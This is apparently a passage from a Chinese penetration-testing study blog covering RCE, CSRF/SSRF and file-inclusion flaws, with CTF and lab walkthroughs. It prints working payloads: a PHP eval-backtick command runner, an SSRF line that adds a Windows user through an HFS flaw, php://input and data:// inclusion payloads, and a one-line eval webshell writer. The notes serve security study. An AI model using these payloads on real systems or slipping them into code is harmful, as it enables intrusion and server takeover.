<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%8A%9F%E8%83%BD%E7%82%B9%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp13.png" alt="黑盒功能点命令执行-wp13"></p>
<h3 id="白盒代码及命令执行-代码分析"><a href="#白盒代码及命令执行-代码分析" class="headerlink" title="白盒代码及命令执行-代码分析"></a>白盒代码及命令执行-<em>代码分析</em></h3><p>地址：<a href="https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe">墨者学院-PHP代码分析溯源(第4题)</a></p>
<h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><p>访问把场所给地址</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp1.png" alt="白盒代码及命令执行-wp1"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(gzinflate(base64_decode(&amp;<span class="number">40</span>pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//分析这里面是一段加密内容40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==</span></span><br></pre></td></tr></table></figure>

<p>将源代码放在本地做功能测试</p>
<p>注意要把首尾的&amp;替换成””，并用echo输出，得到加密内容</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp2.png" alt="白盒代码及命令执行-wp2"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里的考点</span></span><br><span class="line"><span class="keyword">echo</span> `cmd`</span><br><span class="line"><span class="comment">//cmd处为执行的命令</span></span><br></pre></td></tr></table></figure>

<p>这里是通过<code>$_REQUEST</code>传参，可以接收cookie，get，post的值</p>
<p>我们这里采用get传参</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp3.png" alt="白盒代码及命令执行-wp3"></p>
<p><code>cat&lt;key</code></p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp4.png" alt="白盒代码及命令执行-wp4"></p>
<p>右键查看源码，得到key值</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-wp5.png" alt="白盒代码及命令执行-wp5"></p>
<h4 id="echo-测试"><a href="#echo-测试" class="headerlink" title="echo ``测试"></a>echo ``测试</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//eval(gzinflate(base64_decode(&quot;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;&quot;)));</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo `<span class="subst">$a</span>`;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//Windows和Linux下均能执行系统命令</span></span><br></pre></td></tr></table></figure>



<h3 id="黑盒层RCE漏洞检测-公开漏洞"><a href="#黑盒层RCE漏洞检测-公开漏洞" class="headerlink" title="黑盒层RCE漏洞检测-公开漏洞"></a>黑盒层RCE漏洞检测-<em>公开漏洞</em></h3><p>地址：<a href="https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe">墨者学院-Webmin未经身份验证的远程代码执行</a></p>
<h4 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h4><p>访问把场所给地址</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp1.png" alt="黑盒层RCE漏洞检测-wp1"></p>
<p>随便输入登录信息</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp2.png" alt="黑盒层RCE漏洞检测-wp2"></p>
<p>Google搜索公开的exp，找到复现文章，利用burp抓包，放到Repeater里，根据搜索的文章改参数</p>
<p>修改POST的路径和值</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp3.png" alt="黑盒层RCE漏洞检测-wp3"></p>
<p>根据题目说key在根目录下，于是利用<code>ls /</code>，将改过的数据包发送，找到key </p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp4.png" alt="黑盒层RCE漏洞检测-wp4"></p>
<p>再用<code>cat&lt;/key.txt</code>即可，注意是<code>/</code>目录下</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-5-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%BB%91%E7%9B%92%E5%B1%82RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-wp5.png" alt="黑盒层RCE漏洞检测-wp5"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/LRedAnt/article/details/103701507">https://blog.csdn.net/LRedAnt/article/details/103701507</a></p>
<p><a href="https://xz.aliyun.com/t/6040">https://xz.aliyun.com/t/6040</a></p>
<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/ermei/p/6689005.html">JAVA web网站代码审计－－入门</a></p>
<p><a href="http://blog.leanote.com/post/snowming/9da184ef24bd">PHP 远程代码执行漏洞复现（CVE-2019-11043）</a></p>
<p><a href="https://www.freebuf.com/articles/web/262005.html">远程命令与代码执行总结</a></p>
]]></content>
      <categories>
        <category>小迪安全-Web渗透测试笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF及SSRF</title>
    <url>/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/</url>
    <content><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><blockquote>
<p>跨站脚本请求</p>
<p>Cross-Site Request Forgery</p>
</blockquote>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF.png" alt="CSRF"></p>
<p>攻击者在自己的服务器上构造了攻击代码（比如知道添加管理员的数据包），受害者（管理员）用自己的身份权限在自己的浏览器去访问攻击链接</p>
<span id="more"></span>

<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>利用burp抓包，并且发送至<code>Generate CSRF PoC</code>这个插件</p>
<p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF%E6%A3%80%E6%B5%8B-1.png" alt="CSRF检测-1"></p>
<p>在这个页面修改信息，并生成攻击代码</p>
<p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/CSRF%E6%A3%80%E6%B5%8B-2.png" alt="CSRF检测-2"></p>
<p>copy攻击代码后，将其放在自己的服务器上</p>
<p>然后用受害者身份在受害者的环境去访问，若信息修改成功，则存在CSRF</p>
<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106097698">Pikachu靶场</a></p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>1.当用户发送重要的请求时需要输入原始密码</p>
<p>2.设置随机<code>token</code>，检测数据报的唯一性（最有效）</p>
<p>3.校验<code>Referer</code>来源，请求时判断请求链接是否是当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）</p>
<p>4.设置验证码</p>
<p>5.限制请求方式只能为POST</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote>
<p>服务器请求伪造</p>
<p>Server-Side Request Forgery</p>
</blockquote>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E5%9B%BE%E8%A7%A3.png" alt="SSRF图解"></p>
<p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等</p>
<p>相当于是可以将存在SSRF的服务器<strong>作为一个代理</strong>，去访问其内网服务端的资源</p>
<p>利用SSRF能实现以下效果:<br>1.扫描内网（主机信息收集，Web应用指纹识别）<br>2.根据所识别应用发送构造的Payload进行攻击<br>3.Denial of service（拒绝服务DOS）</p>
<h3 id="各个协议调用探针"><a href="#各个协议调用探针" class="headerlink" title="各个协议调用探针"></a>各个协议调用探针</h3><p>http</p>
<p>file</p>
<p>dict</p>
<p>ftp</p>
<p>gopher</p>
<h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>端口扫描、指纹识别、漏洞利用、内网探针</p>
<p><a href="http://192.168.xx.xx/phpmyadmin">http://192.168.xx.xx/phpmyadmin</a></p>
<p>file:///D:/<a href="http://www.txt/">www.txt</a></p>
<p>dict://192.168.xx.xx:3306/info</p>
<p><a href="ftp://192.168.xx.xx/">ftp://192.168.xx.xx:21</a></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    请输入图片地址：&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;url&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*内网的某台主机村子啊HFS漏洞,这里是通过存在SSRF的服务器对其内网主机进行利用</span></span><br><span class="line"><span class="comment">url=$_POST[&#x27;url&#x27;];</span></span><br><span class="line"><span class="comment">$img = file_get_contents(&#x27;http://192.168.xx.xx:8080/?search==%00&#123;.exec|cmd.exe%20/c%20net%20user%20test1234%201234%20/add.&#125;&#x27;);</span></span><br><span class="line"><span class="comment">echo $url;</span></span><br><span class="line"><span class="comment">echo $img;</span></span><br><span class="line"><span class="comment">//header(&quot;Content-Type: img/jpeg;text/html; charset=utf-8&quot;);</span></span><br><span class="line"><span class="comment">//echo $img;</span></span><br><span class="line"><span class="comment">//$file = fopen(&#x27;x,png, &#x27;w+&#x27;);</span></span><br><span class="line"><span class="comment">//fwrite($file, $img);</span></span><br><span class="line"><span class="comment">//fclose($file);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;URL&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.png" alt="SSRF漏洞挖掘"></p>
<h3 id="SSRF在各个编程语言中可以使用的协议"><a href="#SSRF在各个编程语言中可以使用的协议" class="headerlink" title="SSRF在各个编程语言中可以使用的协议"></a>SSRF在各个编程语言中可以使用的协议</h3><p><img src="/2021/08/27/Web%E6%BC%8F%E6%B4%9E-4-CSRF%E5%8F%8ASSRF/SSRF%E5%9C%A8%E5%90%84%E4%B8%AA%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8D%8F%E8%AE%AE.png" alt="SSRF在各个编程语言中可以使用的协议"></p>
<h3 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a>真实案例</h3><p>地址：<a href="https://dict.youdao.com/w/http%3A%2F%2F127.0.0.1/#keyfrom=dict2.top">https://dict.youdao.com/w/http%3A%2F%2F127.0.0.1/#keyfrom=dict2.top</a></p>
<p>当输入<code>http://127.0.0.1</code>与直接输入<code>127.0.0.1</code>返回结果有差异，表明可能存在SSRF漏洞</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://pan.baidu.com/s/1bp96ECJ">CSRFTester-1.0</a></p>
<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
<p><a href="https://blog.csdn.net/Android_wxf/article/details/118582585">CSDN-看我一招征服SSRF</a></p>
<h2 id="参考视频"><a href="#参考视频" class="headerlink" title="参考视频"></a>参考视频</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=28&spm_id_from=pageDriver">【小迪安全】WEB漏洞-CSRF及SSRF</a></p>
]]></content>
      <categories>
        <category>小迪安全-Web渗透测试笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>CSRF</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8.png" alt="文件操作安全"></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>将包含文件以脚本代码执行</p>
<span id="more"></span>

<h2 id="文件包含各个脚本代码"><a href="#文件包含各个脚本代码" class="headerlink" title="文件包含各个脚本代码"></a>文件包含各个脚本代码</h2><p>PHP：&lt;?php include(“test.php”);?&gt;</p>
<p>ASP：&lt;!–#include file=”1.asp” –&gt;    </p>
<p>ASPX：&lt;!–include file=”1.aspx” –&gt;</p>
<p>JSP：&lt;c: import url=”<a href="http://thief.one/1.jsp&quot;&gt;">http://thief.one/1.jsp&quot;&gt;</a></p>
<p>​          &lt;jsp:include page=”head.jsp”/&gt;</p>
<p>​          &lt;%@ include file=”head.jsp”%&gt;</p>
<h2 id="php文件包含函数"><a href="#php文件包含函数" class="headerlink" title="php文件包含函数"></a>php文件包含函数</h2><h3 id="include-、require"><a href="#include-、require" class="headerlink" title="include()、require()"></a>include()、require()</h3><p>require()语句的性能与include()相类似，都是包括并运行指定文件。不同之处在于：对include()语句来说，在执行文件时每次都要进行<strong>读取和评估</strong>；而对于require()来说，文件只处理一次（<strong>实际上，文件内容替换require()语句</strong>）。</p>
<p>这就意味着如果可能执行多次的代码，则使用require()效率比较高。另外一方面，如果每次执行代码时是读取不同的文件，或者有通过一组文件迭代的循环，就使用include()语句。</p>
<h3 id="include-once-、require-once"><a href="#include-once-、require-once" class="headerlink" title="include_once()、require_once()"></a>include_once()、require_once()</h3><p>如果该文件中的代码已经被包括了，则不会再次包括。</p>
<p>这两个语句应该用于在脚本执行期间，同一个文件有可能被包括超过一次的情况下，确保它只被包括一次，以避免函数重定义以及变量重新赋值等问题。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/shenpengchao/article/details/52326233">PHP中include和require的区别详解</a></p>
<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>含义：包含网站所在本地的文件</p>
<p>无限制</p>
<p>直接包含本地文件即可，还可以进行目录穿越</p>
<p>有限制</p>
<p>1.%00截断</p>
<p>条件：<code>magic_quotes_gpc = Off</code>且<code>PHP版本&lt;5.3.4</code></p>
<p>2.长度截断</p>
<p>条件：Windows，文件命名最长256，可以重复添加<code>/.</code>或<code>.</code>等使长度超过256；Linux下需要长于4096</p>
<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD.png" alt="长度截断"></p>
<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB.png" alt="远程包含"></p>
<p>含义：我们自己创建一个可以访问到的地址，利用该漏洞去包含我们创建地址的文件</p>
<p>无限制</p>
<p>直接包含文件即可，还可以进行目录穿越</p>
<p>有限制：强制添加后缀等</p>
<p>在文件名末尾加<code>%20</code>,<code>%23</code>,<code>?</code>都可以</p>
<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%B7%BB%E5%8A%A0%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7.png" alt="添加特殊符号"></p>
<h2 id="各种协议流-php"><a href="#各种协议流-php" class="headerlink" title="各种协议流(php)"></a>各种协议流(php)</h2><p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%90%84%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%96%B9%E6%B3%95.png" alt="各协议的利用条件和方法"></p>
<h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>用于访问本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。</p>
<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、file://[文件的绝对路径和文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br><span class="line">2、[文件的相对路径和文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure>



<h3 id="http-、https"><a href="#http-、https" class="headerlink" title="http://、https://"></a>http://、https://</h3><p>URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源，通常用于远程包含。</p>
<h4 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://网络路径和文件名</span><br><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>

<h3 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h3><p>php:// 用于访问各个输入/输出流（I/O streams），经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
<table>
<thead>
<tr>
<th>协议</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td>php://input</td>
<td align="left">可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
</tr>
<tr>
<td>php://output</td>
<td align="left">只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
</tr>
<tr>
<td>php://fd</td>
<td align="left">(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
</tr>
<tr>
<td>php://memory php://temp</td>
<td align="left">(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
</tr>
<tr>
<td>php://filter</td>
<td align="left">(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody></table>
<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
<h4 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、data://text/plain,[代码内容]</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">2、data://text/plain;base64,[base64加密后代码内容]</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>



<h3 id="读取文件源码用法"><a href="#读取文件源码用法" class="headerlink" title="读取文件源码用法"></a>读取文件源码用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=[文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure>

<p>　</p>
<h3 id="执行php代码用法"><a href="#执行php代码用法" class="headerlink" title="执行php代码用法"></a>执行php代码用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://input + [POST DATA]</span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<p>　　</p>
<h3 id="写入一句话木马用法"><a href="#写入一句话木马用法" class="headerlink" title="写入一句话木马用法"></a>写入一句话木马用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p>详见：<a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="南邮CTF-文件包含"><a href="#南邮CTF-文件包含" class="headerlink" title="南邮CTF-文件包含"></a><a href="http://4.chinalover.sinaapp.com/web7/index.php">南邮CTF-文件包含</a></h3><h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>本题考点是<strong>本地包含</strong>并<strong>读取</strong></p>
<p>直接利用读文件协议<code>php://filter/read=convert.base64-encode/resource=index.php</code>，去读取index.php的源码</p>
<p>得到:</p>
<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%8D%97%E9%82%AECTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-wp1.png" alt="南邮CTF-文件包含-wp1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</span><br></pre></td></tr></table></figure>

<p>base64解密后得到flag</p>
<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%8D%97%E9%82%AECTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-wp2.png" alt="南邮CTF-文件包含-wp2"></p>
<p>拓展</p>
<p>LFI：Local_File_Include</p>
<h3 id="i春秋百度杯-2017年二月场-web-include"><a href="#i春秋百度杯-2017年二月场-web-include" class="headerlink" title="i春秋百度杯-2017年二月场-web-include"></a><a href="https://www.ichunqiu.com/battalion">i春秋百度杯-2017年二月场-web-include</a></h3><h4 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h4><p>判断系统类型：改后缀大小写，区分大小写是Linux，不区分则是Windows</p>
<p>访问靶场后显示如下：</p>
<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web-include-wp1.png" alt="web-include-wp1"></p>
<p>直接先<code>?path=flag.php</code>，但无结果</p>
<p>试试用php://input尝试命令执行</p>
<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web-include-wp2.png" alt="web-include-wp2"></p>
<p>再用cat去读该文件，并右键查看源码得到flag</p>
<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web-include-wp3.png" alt="web-include-wp3"></p>
